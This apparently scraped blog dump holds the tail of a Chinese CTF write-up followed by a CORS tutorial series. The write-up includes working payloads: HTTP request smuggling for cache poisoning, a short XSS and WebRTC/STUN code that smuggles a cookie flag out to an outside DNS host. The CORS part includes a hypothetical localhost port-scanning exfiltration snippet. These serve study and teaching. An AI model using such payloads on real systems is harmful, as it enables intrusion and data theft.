server 中，而目標是要污染快取。 解法直接貼 zeyu 的 writeup，就是像 request smuggling 那樣構造出一個兩邊理解不同的請求： GET &#x2F;aaaaa HTTP&#x2F;1.1 Host: localhost transfer-encoding: chunked Content-Length: 102 0 GET &#x2F;post&#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP&#x2F;1.1 X: GET &#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;.well-known&#x2F;jwks.json HTTP&#x2F;1.1 Host: localhost cache server 會看 Content-Length，把第二個請求看作是 GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json，而 backend server 看 transfer-encoding，所以看作是 GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5，如此一來就能用另一個 path 的 response 去污染 jwks.json，達成 cache poisoning Golf Jail (16 solves)這題我有認真解，大概花了一天左右，覺得很有趣，而且程式碼很精簡。 &lt;?php header(\"Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';\"); header(\"Cross-Origin-Opener-Policy: same-origin\"); $payload = \"🚩🚩🚩\"; if (isset($_GET[\"xss\"]) &amp;&amp; is_string($_GET[\"xss\"]) &amp;&amp; strlen($_GET[\"xss\"]) &lt;= 30) &#123; $payload = $_GET[\"xss\"]; &#125; $flag = \"SEKAI&#123;test_flag&#125;\"; if (isset($_COOKIE[\"flag\"]) &amp;&amp; is_string($_COOKIE[\"flag\"])) &#123; $flag = $_COOKIE[\"flag\"]; &#125; ?> &lt;!DOCTYPE html> &lt;html> &lt;body> &lt;iframe sandbox=\"allow-scripts\" srcdoc=\"&lt;!-- &lt;?php echo htmlspecialchars($flag) ?> -->&lt;div>&lt;?php echo htmlspecialchars($payload); ?>&lt;/div>\" >&lt;/iframe> &lt;/body> &lt;/html> 給你一個 30 字的 free XSS，要能執行任意程式碼。 這邊的巧妙之處是用了 &lt;iframe srcdoc&gt; 搭配 sandbox=allow-scripts，創造出一個可以執行程式碼，但同時 origin 又是 null，而且 CSP 還繼承上層的執行環境。 因此你無法存取到 top 的任何資訊，包括 name 或是 location 之類的都不行。 到處找來找去之後在 document 裡面找到了 baseURI，發現它的值原來會繼承上層，而且是完整的 path，所以用 &lt;svg/onload=eval(&quot;&#39;&quot;+baseURI)&gt; 以後搭配 hash 就可以執行任意程式碼了，剛好 30 個字。 這邊之所以可以用 baseURI 就可以存取到 document.baseURI，是因為 inline event handler 的 scope 會自動被加上 document，這我在接觸資安才發現我不懂前端這篇裡面有寫到過。 有了 XSS 以後，可以用 document.childNodes[0].nodeValue 把 flag 取出來，最後的問題就是要怎麼傳出去。這題 CSP 很嚴格，而且重新導向又不能使用，也不能 window.open（話說我覺得這個網頁不用開啟新的 navigate-to 就可以達到類似的效果，很厲害），那就只能用一些現成的繞過了。 我先試了 dns prefetch 但是沒用，發現 Chrome 在 112 的時候 release 了 Feature: Resoure Hint “Least Restrictive” CSP，或許這就是原因？ 但沒關係，WebRTC 還是有用的，只是我自己試很久都沒試出來怎麼用，最後是看別題的 writeup，直接拿裡面 payload 出來用，再搭配 DNS： var flag = document.childNodes[0].nodeValue.trim() .replace(\"SEKAI&#123;\", \"\").replace(\"&#125;\", \"\") .split(\"\").map(c => c.charCodeAt(0)).join(\".\"); var p = new RTCPeerConnection(&#123; iceServers: [&#123; urls: \"stun:\" + flag + \".29e6037fd1.ipv6.1433.eu.org:1337\" &#125;] &#125;); p.createDataChannel(\"d\"); p.setLocalDescription() Leakless Note (4 solves)前面寫過的 leakynote 的進階版，這次 CSP 變嚴格，多了 default-src &#39;self&#39;，然後頁面上也沒有其他 css 檔案了。 情境一樣，有一個 iframe，可能會載入可能沒載入，要能偵測到這點。 作者 strellic 的解法是： // leakless note oracle const oracle = async (w, href) => &#123; const runs = []; for (let i = 0; i &lt; 8; i++) &#123; const samples = []; for (let j = 0; j &lt; 600; j++) &#123; const b = new Uint8Array(1e6); const t = performance.now(); w.frames[0].postMessage(b, \"*\", [b.buffer]); samples.push(performance.now() - t); delete b; &#125; runs.push(samples.reduce((a,b)=>a+b, 0)); w.location = href; await sleep(500); // rate limit await waitFor(w); &#125; runs.sort((a,b) => a-b); return &#123; median: median(runs.slice(2, -2)), sum: runs.slice(2, -2).reduce((a,b)=>a+b,0), runs &#125; &#125; 當你對 iframe 送一個很大的 message 的時候，花費的時間會不一樣。 另一隊似乎是開了 1000 個 tab 然後去測網路的時間，現在想想發現好像還滿合理的？如果 iframe 是 200 的話就會發出一堆 request，拖慢網路速度。","link":"/2023/09/02/corctf-sekaictf-2023-writeup/"},{"title":"CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？","text":"前言三年前的時候寫了一篇文章：輕鬆理解 AJAX 與跨來源請求，提到了串接 API、AJAX、same-origin policy、JSONP 以及 CORS，當時把自己想講的都放進去了，但現在回頭看，好像有很多滿重要的部分沒有提到。 三年後，再次挑戰這個主題，並且試著表達地更完整。 會想寫這個系列是因為在程式相關的討論區上，CORS 是發問頻率很高的主題，無論是前端或是後端都有可能來問相關的問題。 所以我就想說：「好，那我來寫一個系列好了，我要試著把這個主題寫到每個碰到 CORS 問題的人都會來看這個系列，而且看完以後就知道該怎麼解決問題」，這算是我對這篇文章的目標，如果文章的品質沒辦法達成這個目標，我會持續改進。 這系列一共有六篇文章，分別是： CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？ CORS 完全手冊（二）：如何解決 CORS 問題？ CORS 完全手冊（三）：CORS 詳解 CORS 完全手冊（四）：一起看規範 CORS 完全手冊（五）：跨來源的安全性問題 CORS 完全手冊（六）：總結、後記與遺珠 會從 same-origin policy 開始講起，接著講到為什麼跨來源存取資源會有錯誤，再來會講如何錯誤地以及正確地解決 CORS 相關的問題，而第三篇會詳細講解跨來源請求的詳細流程，像是 preflight request 之類的東西。 基礎的部分看前三篇就夠了，接下來會比較深一點。第四篇會帶你一起看 spec，證明前面幾篇不是我在虎爛的，而第五篇則是帶大家看看 CORB（Cross-Origin Read Blocking）、COEP（Cross-Origin Embedder Policy）或是 COOP（Cross-Origin-Opener-Policy）之類的跨來源相關規定，以及相關的安全性問題，最後一篇則是一些比較零散的主題以及心得感想。 身為系列文的第一篇，就是要帶大家去思考為什麼要有 same-origin policy 的存在，為什麼跨來源存取資源會錯誤。如果不知道這個問題的答案，那通常都不是真的理解 CORS 到底在規範什麼，也很有可能會用一些錯誤的解法去解這個問題。 在這篇裡面，我預設大家已經對跨來源請求以及 CORS 有一些基本概念了，如果完全沒有概念的話，可以先參考一下我以前寫過的這篇：輕鬆理解 AJAX 與跨來源請求。 在正式開始以前，想先跟大家講一個小故事，跟整個 CORS 有關的一個小故事，反正大家就當一個無厘頭故事看就好，等真正理解完整個跨來源請求相關的東西以後，就知道這故事代表什麼了。 故事的主角是一個求知若渴，希望獲得各種資訊的小資（不是小資女孩向前衝的那個小資），而政府想要監控這些求知若渴的人，試圖知道他們到底都去問了哪些資訊，所以把他安置在一個小房間，跟外界的溝通都要透過門口的警衛。 所以小資沒辦法親自出去，但是有什麼想知道的事情都可以問警衛，警衛都會幫他去問。身為一個求知若渴的人，小資常常問他很多問題，例如說：「速食店的大麥克現在一個多少錢？」、「我的存款剩下多少？」、「我爸媽過得好嗎」等等。 針對小資的每一個提問，警衛都會幫他去問到當事人，但不一定會把答案告訴他。政府規定了一個程序，那就是「除非被問的人明確同意，不然不能把答案告訴小資」，所以警衛會先問完問題拿到答案，再問說：「請問你願意讓小資知道這件事嗎？」，有些人願意，例如說速食店，雖然他根本不認識小資，但畢竟這類資訊告訴誰都可以。但也有些人不願意，因為根本不知道誰是小資。還有一種狀況，警衛連問都不用問，那就是小資的家人。因為小資的家人跟小資血脈相承，系出同源，所以不用問就可以放行。 於是呢，儘管小資的每一個問題都有傳達到被問的人那裡，卻不一定能收到回覆。有一天小資終於受不了這種被囚禁的生活，於是想了幾個方法。 第一個方法是把警衛打倒逃出去，沒有警衛了他就自由了，想問誰問題就問誰，不用再透過警衛，完全沒有任何拘束。 第二個方法是拜託朋友幫忙當暗樁。每當小資有問題時，都跟警衛說：「你去問我朋友，大麥克多少錢」，接著朋友再去問速食店，再把結果跟警衛講，順便交代警衛他願意讓小資知道這件事。因為問題都會透過他朋友轉傳，而朋友每次都會交代警衛這個資訊可以讓小資知道，所以小資就不會有之前提到的那個限制了。 第三個方法是讓大家都願意把資訊告訴他，這樣就不會被警衛攔截，就能順利知道問題的答案。 好，故事結束了，雖然我覺得沒有到很貼切就是了，不過浮誇的故事總是比較吸引人注意，就先這樣吧，接著讓我們來進入主題。 從熟悉的錯誤訊息開始我相信大家一定都對這個錯誤訊息不陌生： request has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. 在前端用 XMLHttpRequest 或者是用 fetch 的時候，應該都有碰過這個錯誤。在串接後端或是網路上的 API 時，就是串不起來，而你也不知道是哪邊出了錯，甚至連這是前端還是後端要處理的可能都不太知道。 因此，我在這邊直接先跟你講答案： 大部分情形下，CORS 都不是前端的問題，純前端是解決不了的。 換句話說，碰到這個錯誤的時候，通常都不是你應該要解決問題，而是後端。大家可以先把這一句話放在心中，等到看完文章的時候，應該就會認同這句話了。 既然 CORS 的這個錯誤是出在「跨來源呼叫 API」，那勢必就要兩件事情要釐清： 什麼是跨來源？ 為什麼不能跨來源呼叫 API？ 什麼是跨來源？跨來源的英文是 cross origin，顧名思義，當你想要從來源 A 去拿來源 B 的東西，就是跨來源。 而這個來源，其實就是代表著「發送 request 的來源」，例如說你現在在 https://huli.tw 發送一個 request 出去，那這個 request 的 origin 就是 https://huli.tw。 而 same origin 就代表著來源一樣，如果有兩個 URL A 跟 B 的 origin 是一樣的，我們就說 A 跟 B 是 same origin，也叫做「同源（同個來源）」。 所以 https://huli.tw 跟 https://google.com 不同源，因為它們的 origin 不一樣。 更精確一點地說，你可以把 origin 當作是：scheme + host + port 的組合。scheme 就是最前面的那個 https 或是 http 之類的東西，host 就是 huli.tw，而 port 的話如果沒有特別指定，http 預設的 port 就是 80，https 就是 443。 所以呢， https://huli.tw 跟 https://huli.tw/api 同源，因為 scheme + host + port 都一樣（/api 是 path 的部分，不是 host） https://huli.tw 跟 http://huli.tw 不同源，因為 scheme 不一樣 http://huli.tw 跟 http://huli.tw:3000 不同源，因為 port 不一樣 https://api.huli.tw 跟 https://data.huli.tw 不同源，因為 host 不一樣 https://huli.tw 跟 https://api.huli.tw 不同源，因為 host 不一樣 第五點是大家要特別注意的一點，domain 跟 subdomain 之間也是不同源的，所以 api.huli.tw 跟 huli.tw 不同源。有很多人常常會把這個跟 cookie 搞混，因為 api.huli.tw 跟 huli.tw 是可以共用 cookie 的。 在這邊特別強調，cookie 比對的規則叫做：Domain Matching ，它是看 domain 而不是看我們這邊所定義的 origin，千萬不要搞混了。 從以上範例可以得知，其實要達成 same origin 滿困難的，如果只看網址的話，基本上要長得一模一樣，只有 path 跟後面的部分可以不一樣，例如說 https://huli.tw/a/b/c/index.html?a=1 跟 https://huli.tw/show/cool/b.html 他們都是在同一個 scheme + host + post 底下，origin 都會是https://huli.tw，因此這兩個網址是同源的。 在實務上面，其實也滿常會把前端網站本身跟 API 用不同的網域來表示，例如說 huli.tw 就是前端網站，api.huli.tw 就是後端 API，所以實務上也很常碰到跨來源請求的場景。 （順帶一提，想避開跨來源的話會把前後端放在同一個 origin 下，例如說 huli.tw&#x2F;api 就都是後端 API，其他路徑則是前端網站。） 為什麼不能跨來源呼叫 API？理解了同源的定義之後，我們可以來看剛剛的另一個問題，就是：「為什麼不能跨來源呼叫 API？」。 但其實這個定義有點不清楚，更精確一點的說法是：「為什麼不能用 XMLHttpRequest 或是 fetch（或也可以簡單稱作 AJAX）獲取跨來源的資源？」 會特別講這個更精確的定義，是因為去拿一個「跨來源的資源」其實很常見，例如說 &lt;img src=&quot;https://another-domain.com/bg.png&quot; /&gt;，這其實就是跨來源去抓取資源，只是這邊我們抓取的目標是圖片而已。 或者是：&lt;script src=&quot;https://another-domain.com/script.js&quot; /&gt;，這也是跨來源請求，去抓一個 JS 檔案回來並且執行。 但以上兩種狀況你有碰到過問題嗎？基本上應該都沒有，而且你已經用得很習慣了，完全沒有想到可能會出問題。 那為什麼變成 AJAX，變成用 XMLHttpRequest 或是 fetch 的時候就不同了？為什麼這時候跨來源的請求就會被擋住？（這邊的說法其實不太精確，之後會詳細解釋） 要理解這個問題，其實你要反過來想。因為你已經知道「結果」就是會被擋住，既然結果是這樣，那一定有它的原因，可是原因是什麼呢？這有點像是反證法一樣，你想要證明一個東西 A，你就先假設 A 是錯的，然後找出反例發現矛盾，就能證明 A 是對的。 要思考這種技術相關問題時也可以採取類似的策略，你先假設「擋住跨來源請求」是錯的，是沒有意義的，再來如果你發現矛盾，發現其實是必要的，你就知道為什麼要擋住跨來源請求了。 因此，可以思考底下這個問題： 如果跨來源請求不會被擋住，會發生什麼事？ 那我就可以自由自在串 API，不用在那邊 google 找 CORS 的解法了！聽起來好像沒什麼問題，憑什麼 img 跟 script 標籤都可以，但 AJAX 卻不行呢？ 如果跨來源的 AJAX 不會被擋的話，那我就可以在我的網域的網頁（假設是 https://huli.tw/index.html），用 AJAX 去拿 https://google.com的資料對吧？ 看起來好像沒什麼問題，只是拿 Google 首頁的 HTML 而已，沒什麼大不了。 但如果今天我恰好知道你們公司有一個「內部」的公開網站，網址叫做 http://internal.good-company.com，這是外部連不進去的，只有公司員工的電腦可以連的到，然後我在我的網頁寫一段 AJAX 去拿它的資料，是不是就可以拿得到網站內容？那我拿到以後是不是就可以傳回我的 server？ 這樣就有了安全性的問題，因為攻擊者可以拿到一些機密資料。 目標打開惡意網站 惡意網站用 AJAX 抓取內部機密網站的資料 拿到資料 回傳給攻擊者的 server 你可能會問說：「可是要用這招，攻擊者也要知道你內部網站的網址是什麼，太難了吧！」 如果你覺得這樣太難，那我換個例子。 我請問你一個問題，你平常在開發的時候，是不是都是在自己電腦開一個 server 起來，網址有可能是 http://localhost:3000 或是 http://localhost:5566 之類的？以現代前端開發來說，這再常見不過了。 如果瀏覽器沒有擋跨來源的 API，那我就可以寫一段這樣的程式碼： // 發出 request 得到資料 function sendRequest(url, callback) &#123; const request = new XMLHttpRequest(); request.open('GET', url, true); request.onload = function() &#123; callback(this.response); &#125; request.send(); &#125; // 嘗試針對每一個 port 拿資料，拿到就送回去我的 server for (let port = 80; port &lt; 10000; port++) &#123; sendRequest('http://localhost:' + port, data => &#123; // 把資料送回我的 server &#125;) &#125; 如此一來，只要你有跑在 localhost 的 server，我就可以拿到你的內容，進而得知你在開發的東西。在工作上，這有可能就是公司機密了，或是攻擊者可以藉由分析這些網站找出漏洞，然後用類似的方法打進來。 再者，如果你覺得以上兩招都不可行，在這邊我們再多一個假設。除了假設跨來源請求不會被擋以外，也假設「跨來源請求會自動附上 cookie」。 所以如果我發一個 request 到 https://www.facebook.com/messages/t，就可以看到你的聊天訊息，發 request 到 https://mail.google.com/mail/u/0/，就可以看到你的私人信件。 講到這邊，你應該可以理解為什麼要擋住跨來源的 AJAX 了，說穿了就是三個字： 安全性 在瀏覽器上，如果你想拿到一個網站的完整內容（可以完整讀取），基本上就只能透過 XMLHttpRequest 或是 fetch。若是這些跨來源的 AJAX 沒有限制的話，你就可以透過使用者的瀏覽器，拿到「任意網站」的內容，包含了各種可能有敏感資訊的網站。 因此瀏覽器會擋跨來源的 AJAX 是十分合理的一件事，就是為了安全性。 這時候有些人可能會有個疑問：「那為什麼圖片、CSS 或是 script 不擋？」 因為這些比較像是「網頁資源的一部分」，例如說我想要用別人的圖片，我就用 &lt;img&gt; 來引入，想要用 CSS 就用 &lt;link href=&quot;...&quot;&gt;，這些標籤可以拿到的資源是有限制的。再者，這些取得回來的資源，我沒辦法用程式去讀取它，這很重要。 我載入圖片之後它就真的只是張圖片，只有瀏覽器知道圖片的內容，我不會知道，我也沒有辦法用程式去讀取它。既然沒辦法用程式去讀取它，那我也沒辦法把拿到的結果傳到其他地方，就比較不會有資料外洩的問題。 想要正確認識跨來源請求，第一步就是認識「為什麼瀏覽器要把這些擋住」，而第二步，就是對於「怎麼個擋法」有正確的認知。底下我準備了兩題小測驗，大家可以試著回答看看。 隨堂小測驗第一題小明正負責寫一個專案，網址是：https://best-landing-page.tw。這網站會需要用到公司其他網站的某個檔案，裡面是一些使用者資料，網址是：https://lidemy.com/users.json。小明直接點開這個網址，發現用瀏覽器可以看到檔案的內容，於是就說： 既然我用瀏覽器可以看得到內容，就表示瀏覽器打得開，那用 AJAX 的時候也一定可以拿得到資料！我們來用 AJAX 拿資料吧！ 請問小明的說法是正確的嗎？如果錯誤，請指出錯誤的地方。 第二題小明正在做的專案需要串接 API，而公司內部有一個 API 是拿來刪除文章的，只要把文章 id 用 POST 以 application/x-www-form-urlencoded 的 content type 帶過去即可刪除。 舉例來說：POST https://lidemy.com/deletePost 並帶上 id&#x3D;13，就會刪除 id 是 13 的文章（後端沒有做任何權限檢查）。 公司前後端的網域是不同的，而且後端並沒有加上 CORS 的 header，因此小明認為前端用 AJAX 會受到同源政策的限制，request 根本發不出去。 而實際上呼叫以後，果然 console 也出現：「request has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource」 的錯誤。 所以小明認為前端沒辦法利用 AJAX 呼叫這個 API 刪除文章，文章是刪不掉的。 請問小明的說法是正確的嗎？如果錯誤，請指出錯誤的地方。 你的跨來源 AJAX 是怎麼被擋掉的？上面這兩題都是觀念題，只要觀念正確就可以輕鬆回答。 而新手，尤其是只碰過瀏覽器上面的 JS 的新手通常觀念都不太正確（這很正常），而最容易有的錯誤觀念，就是對於 same-origin policy 或者是「跨來源請求」的錯誤認知。 首先，第一個重要觀念是：「你是在瀏覽器上面寫程式」。 這是什麼意思？意思就是你在寫 JavaScript 時的諸多限制，都是瀏覽器限制你，而不是程式語言本身限制你。那些你沒辦法做到的事，都是被瀏覽器擋住了。 JavaScript 是一個程式語言，所以像 var、if else、for、function 等等，這些都是 JavaScript 的一部分。但 JavaScript 需要有地方執行，而這個地方就叫做執行環境（runtime），大家最常用的就是：瀏覽器。 所以你的 JavaScript 是在瀏覽器上執行的，而這個執行環境會提供給你一些東西使用，例如說 DOM（document）、console.log、setTimeout、XMLHttpRequest 或是 fetch，這些其實都不是 JavsScript（或是更精確地說，ECMAScript）的一部分。這些是瀏覽器給我們使用的，所以我們只有在瀏覽器上面執行 JavaScript 時才用得到。 因此你可能有過類似的經驗，想說為什麼一樣的 code 搬到 Node.js 去就沒辦法執行。現在你知道了，那是因為 Node.js 並沒有提供這些東西，例如說 fetch，你沒辦法直接在 Node.js 裡面使用它（如果可以，那就代表你有用其它 library 或是 polyfill）。 相反過來也是，你把 JavaScript 用 Node.js 執行時，你可以用 process 或是 fs，但你在瀏覽器上面就沒辦法。不同的執行環境會提供不同的東西，你要很清楚現在是在哪個執行環境。 而有時候，不同的執行環境也會提供相同的東西，例如說 console.log 跟 setTimeout，在瀏覽器以及 Node.js 都有。但儘管他們看起來一樣，內部實作卻是完全不同，表現方法也可能不同。舉例來說，瀏覽器的 console.log 會輸出在 devtool 的 console，而 Node.js 則是會輸出在你的 terminal 上面。而兩者的 setTimeout 實作也不一樣，所以細節可能會有差別。 回到主題，我們在瀏覽器上想要對一個跨來源的資源做 AJAX，然後被擋住了。被誰擋住？瀏覽器。 換句話說，如果沒有瀏覽器，如果我今天不是在瀏覽器上面執行程式，那就根本沒有什麼 same-origin policy，也不用管什麼 CORS。 舉例來說，你今天去當兵，早上起床要折豆腐被，中午吃飯進餐廳要喊親愛精誠，看到長官要問好，講話開頭要加報告兩個字。為什麼？因為軍中是那樣規定的。 可是如果你今天退伍了，不在軍營裡面，也不是阿兵哥了，你就自由了，就再也不用做上面那些事了。瀏覽器在這邊就像是軍營，它是一個限制器，有著諸多的規則，一旦脫離它，就什麼規則都沒有了。 如果你有聽懂我在講什麼，大概就知道為什麼 proxy 一定可以解決 CORS 的問題，因為它是透過後端自己去拿資料，而不是透過瀏覽器（這之後會再詳細講）。 而瀏覽器本身在開網頁的時候，也是根本沒有什麼 same-origin policy 的規則，你想開什麼網頁就開什麼，不會阻止你。 所以隨堂測驗的第一題，用瀏覽器打得開那個 JSON 檔案，這根本不算什麼，因為一定打得開，這跟 CORS 一點關係都沒有。用瀏覽器瀏覽網站，跟用 AJAX 拿資料是完全不同的兩件事。 所以第一題的解答是：「小明的說法錯誤，用瀏覽器能打開檔案不代表什麼，跟 CORS 無關。是不是能夠跨來源使用 AJAX，要看 response 的 header」。 解決了第一題之後，來看第二題，大意就是小明發了一個 request 之後收到 CORS 錯誤，於是就說這 request 被擋掉了。 第二題在考的觀念是： 跨來源請求被瀏覽器擋住，實際上到底是什麼意思？是怎麼被擋掉的？ 會有這一題，是因為有很多人認為：「跨來源請求擋住的是 request」，因此在小明的例子中，request 被瀏覽器擋住，沒辦法抵達 server 端，所以資料刪不掉。 但這個說法其實想一下就知道有問題，你看錯誤訊息就知道了： request has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource 瀏覽器說沒有那個 header 存在，就代表什麼？代表它已經幫你把 request 發出去，而且拿到 response 了，才會知道沒有 Access-Control-Allow-Origin 的 header 存在。 所以瀏覽器擋住的不是 request，而是 response。你的 request 已經抵達 server 端，server 也回傳 response 了，只是瀏覽器不把結果給你而已。 因此第二題的答案是，儘管小明看到這個 CORS 的錯誤，但因為 request 其實已經發到 server 去了，所以文章有被刪掉，只是小明拿不到 response 而已。對，文章被刪掉了，真的。 最後再補充一個觀念，前面有講說擋 CORS 是為了安全性，如果沒有擋的話，那攻擊者可以利用 AJAX 去拿內網的非公開資料，公司機密就外洩了。而這邊我又說「脫離瀏覽器就沒有 CORS 問題」，那不就代表就算有 CORS 擋住，我還是可以自己發 request 去同一個網站拿資料嗎？難道這樣就沒有安全性問題嗎？ 舉例來說，我自己用 curl 或是 Postman 或任何工具，應該就能不被 CORS 限制住了不是嗎？ 會這樣想的人忽略了一個特點，這兩種有一個根本性的差異。 假設今天我們的目標是某個公司的內網，網址是：http://internal.good-company.com 如果我直接從我電腦上透過 curl 發 request，我只會得到一個錯誤，因為一來我不是在那間公司的內網所以沒有權限，二來我甚至連這個 domain 都有可能連不到，因為只有內網可以解析。 而 CORS 是：「我寫了一個網站，讓內網使用者去開這個網站，並且發送 request 去拿資料」。這兩者最大的區別是「是從誰的電腦造訪網站」，前者是我自己，後者則是透過其他人（而且是可以連到內網的人）。 如圖所示，上半部是攻擊者自己去連那個網址，會連不進去，因為攻擊目標在內網裡。所以儘管沒有 same-origin policy，攻擊者依然拿不到想要的東西。 而下半部則是攻擊者寫了一個惡意網站，並且想辦法讓使用者去造訪那個網站，像是標 1 的那邊，當使用者造訪網站之後，就是 2 的流程，會用 AJAX 發 request 到攻擊目標（internal server），3 拿完資料以後，就是步驟 4 回傳到攻擊者這邊。 有了 same-origin policy 的保護，步驟 4 就不會成立，因為 JS 拿不到 fetch 完的結果，所以不會知道 response 是什麼。 總結這篇主要講的是為什麼瀏覽器要擋你東西，以及到底是怎麼個擋法，也針對幾點我覺得初學者最常出錯的觀念特別講了一下，幫大家條列式整理重點： 瀏覽器會擋你的跨來源請求，是因為安全性問題。因為 AJAX 你可以直接拿到整個 response，所以不擋的話會有問題，但像是 img 標籤你其實就拿不到 response，所以比較沒有問題 今天會有 same-origin policy 跟 CORS，是因為我們「在瀏覽器上寫 JS」，所以受到執行環境的限制。如果我們今天寫的是 Node.js，就完全沒有這些問題，想拿什麼就拿什麼，不會有人擋我們 在瀏覽器上面，CORS 限制的其實是「拿不到 response」，而不是「發不出 request」。所以 request 其實已經發出去了，瀏覽器也拿到 response 了，只是它因為安全性考量不給你（這講法也有一點不太精確，因為有分簡單請求跟非簡單請求，這個在第三篇會提到）。 在釐清這些重要的觀念以後，就可以進入到我們的下一篇：CORS 完全手冊（二）：如何解決 CORS 問題？。","link":"/2021/02/19/cors-guide-1/"},{"title":"CORS 完全手冊（二）：如何解決 CORS 問題？","text":"前言在上一篇 CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？裡面，我們理解了為什麼瀏覽器要有 same-origin policy，以及跨來源請求擋的其實是 response 而不是 request。在釐清了一些錯誤的觀念以及對 CORS 有基本的認知以後，就可以來講講怎麼樣解決 CORS 的問題。 先跟大家預告一下，這篇會提到的解決問題的方法並不完整。事實上，跨來源請求分成兩種，簡單請求跟非簡單請求，「跨來源請求擋的其實是 response 而不是 request」基本上只適用於簡單請求，而這一篇只會針對「簡單請求」，至於到底怎麼分簡單還是非簡單，以及非簡單的要如何處理，這些都會在下一篇提到。 想要解決基本的 CORS 錯誤，其實有滿多種方法，先來介紹幾個「治標不治本」的： 關掉瀏覽器的安全性設置 把 fetch mode 設成 no-cors 不要用 AJAX 拿資料 以下就會先針對這三個方法再進一步講解，講完以後我們會來講最後一個也是最正確的做法：「請後端加上 CORS header」。 解法一：關掉瀏覽器的安全性設置在上一篇裡面有再三跟大家提過，跨來源請求會被擋住，是因為瀏覽器的限制。所以只要瀏覽器沒有這個限制，就能平平安安快快樂樂拿到 response。 因此解決 CORS 問題的方法之一，就是直接把瀏覽器的安全性設置關掉，簡單暴力又有用。 至於怎麼關閉，如果是 Chrome 的話可以參考：Run Chrome browser without CORS，其他瀏覽器的話就要自己查一下相關資料了。 把安全機制關掉以後，就可以順利拿到 response，瀏覽器也會跳一個提示出來： 問題是解決了，但為什麼我說這是治標不治本呢？因為只有在你電腦上沒問題而已，在其他人的電腦上面還是有問題。有些人會在開發時圖個方便把這個設置關起來，就不會碰到任何 CORS 的問題，但我認為這是比較不好的做法，因為你關掉的不只是 CORS，你連其他安全機制也一起關掉了。 總之呢，只是跟大家介紹有這個解法，但不推薦使用。 解法二：把 fetch mode 設成 no-cors這絕對是新手最常犯的錯誤之一，請看仔細了。 如果你是使用 fetch 去抓取資料，例如說這樣（這個網頁的 origin 是 http://localhost:8081，跟 http://localhost:3000 不同源）： fetch('http://localhost:3000').then(res => &#123; console.log('response', res) return res.text() &#125;).then(body => &#123; console.log('body', body) &#125;) 你就會看到 console 上面跳出顯眼的紅字： Access to fetch at ‘http://localhost:3000/‘ from origin ‘http://localhost:8081‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled. 前半段很熟悉，後半段可能就比較陌生一點。但沒關係，我們看到了關鍵字： set the request&#39;s mode to &#39;no-cors&#39;，喔喔喔，難道說這樣就可以不管 CORS 嗎？馬上來試試看： fetch('http://localhost:3000', &#123; mode: 'no-cors' &#125;).then(res => &#123; console.log('response', res) return res.text() &#125;).then(body => &#123; console.log('body', body) &#125;) 改了程式碼之後重新執行，果真不會跳錯誤出來了！console 一片乾淨，只是印出來的值似乎怪怪的： Response 的 status 是 0，body 的內容是空的，type 是一個叫做 opaque 的東西，看起來很奇怪。但如果我們打開 devtool 並且切到 Network 的那一個 tab 去看，會發現其實後端是有回傳 response 的。 咦，瀏覽器明明就有拿到 response，為什麼程式裡面卻沒有內容？為什麼會這樣呢？ 這是因為，mode: no-cors 跟你想的完全不一樣。 當你傳入 mode: no-cors 的時候，就代表跟瀏覽器說：「我就是要發 request 到一個沒有 CORS header 的 url，所以請不要給我錯誤」，既然是這樣的話，那自然也就不會出現 No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource 這個錯誤，因為你本來就預期到這件事了。 但這樣設置並不代表你就拿得到 response，事實上正好相反，用 mode: no-cors 的話，你一定拿不到 response。沒錯，一定拿不到，就算後端幫你把 Access-Control-Allow-Origin 這個 header 加上去了，你也拿不到 response。 設置這個 mode 以後，並不會神奇地就讓你可以突破限制拿到東西，正好相反，這個模式是在跟瀏覽器說：「我就是要發 request 給一個沒有 cors header 的資源，我知道我拿不到 response，所以你絕對不要給我 response」。 所以，如果你發現你用了 mode: no-cors 這東西，那有 99% 的機率是用錯了，根本不該用這個。用了的話你反而會很困惑，因為： 你在 network tab 可以看到 response 而且你的程式沒有產生任何錯誤 但是你就是拿不到 response，它就是空的，這都是因為 no-cors 這個 mode。用了以後你可能就會跟這個 issue 裡面的人一樣感到困惑。因此加上這個只是不會拿到錯誤而已，但是並沒有突破跨來源的限制，還是拿不到 response。 至於在什麼場合會用到這個 mode，我還要再研究一下，大家可以先參考： Trying to use fetch and pass in mode: no-cors What limitations apply to opaque responses? 解法三：不要用 AJAX 拿資料既然用 AJAX 會被擋跨來源的請求，那如果可以不用 AJAX 拿資料，不就沒有問題了嗎？在上一篇我們有提過，有一些 tag 是不會受到 same-origin policy 的限制的，例如說 img 或者是 script…對，script！ script 一般來說都是引入其他人寫好的程式碼，例如說 jQuery 或是其它套件之類的。但在那個 CORS 規範還不完整的年代，就有一些人想出了用 script 標籤來傳遞資料的妙招，我到現在都覺得很厲害。 簡單來說是這樣的，用 script 可以引入別人的 script 對吧？假設我們要引入的 script 長這樣： var data = &#123; username: 'huli' &#125;; 那我們引入以後，是不是就可以直接存取 data 這個變數，而裡面就是我們想要跨來源拿到的資料。上面的例子算比較簡單的，來舉一個複雜一點點的好了，假設現在我們要傳一個 userId 到 server，然後需要拿到這個 userId 的資料，那我們的 server 可以這樣寫： var express = require('express'); var app = express(); // 事先準備好的資料 const users = &#123; 1: &#123; name: 'user1' &#125;, 2: &#123; name: 'user2' &#125;, 3: &#123; name: 'user3' &#125;, &#125; // 根據傳入的 id 回傳資料 app.get('/users/:userId', function (req, res) &#123; const userId = req.params.userId; res.end(`var data = $&#123;JSON.stringify(users[userId])&#125;`); &#125;); app.listen(3000, function () &#123; console.log('Example app listening on port 3000!'); &#125;); 如果我們造訪 